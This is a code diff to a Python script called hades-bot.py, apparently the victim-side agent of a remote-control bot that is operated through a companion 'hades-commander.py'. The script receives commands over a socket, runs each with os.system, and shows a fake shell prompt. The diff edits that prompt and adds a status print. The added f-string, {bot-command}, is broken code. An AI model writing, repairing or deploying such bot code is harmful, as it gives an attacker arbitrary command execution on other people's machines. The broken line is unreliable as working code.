@@ -49,15 +49,16 @@ class Controller(object):
                     if uid != 0:
                         host_format = '''
 ┌──({host_name})-[{cwd}]
-└─$ '''.format(host=host,cwd=working_directory)
+└─$ '''.format(host_name=host,cwd=working_directory)
                     elif uid == 0:
                         host_format = '''
-┌──(root💀{host})-[{cwd}]
-└─#'''.format(host=host,cwd=working_directory)
+┌──(root💀{host_name})-[{cwd}]
+└─#'''.format(host_name=host,cwd=working_directory)
                     cmd_read = client_socket.recv(buffer_size).decode()
                     print(host_format,end='')
                     airbitrary_cmd_exec = os.system(cmd_read)
-                    client_socket.send(cmd_read.encode())
+                    bot_command = client_socket.send(cmd_read.encode())
+                    print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Command Executed->{bot-command}")
         except Exception as Err:
             print(Err)
             print('\nUsage for help: python3 <hades-bot.py> -h ')
@@ -95,3 +96,4 @@ if __name__ == "__main__":
     banner.join()
     listener.start()
     listener.join()
+#Controll this bot using the hades-commander.py
